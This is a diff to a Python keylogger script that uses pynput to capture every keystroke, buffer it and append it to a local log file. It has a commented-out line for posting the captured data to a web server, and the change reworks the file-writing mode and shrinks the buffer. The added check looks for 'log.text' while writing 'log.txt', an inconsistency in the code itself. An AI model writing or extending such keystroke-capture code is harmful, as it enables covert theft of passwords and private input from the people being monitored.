@@ -1,5 +1,5 @@
 from pynput.keyboard import Listener
-import requests
+import requests, os
 
 class KeyLogger:
     def __init__(self, buffer_size):
@@ -11,12 +11,15 @@ class KeyLogger:
     def write(self):
         log_data = "".join(self.data)
         #write the data to local file
-        with open('log.txt', 'a') as f:
+        mode = 'a'
+        if os.path.isfile('log.text'):
+            mode = 'w'
+
+        with open('log.txt', mode) as f:
             f.write(log_data)
 
         #send data to the internet
         # requests.post("localhost:8000", {'data' : log_data})
-        
 
     def on_pressed(self, key):
         self.data.append(self.process(key))
@@ -36,4 +39,4 @@ class KeyLogger:
         return key
 
 if __name__ == "__main__":
-    k = KeyLogger(100)
+    k = KeyLogger(10)
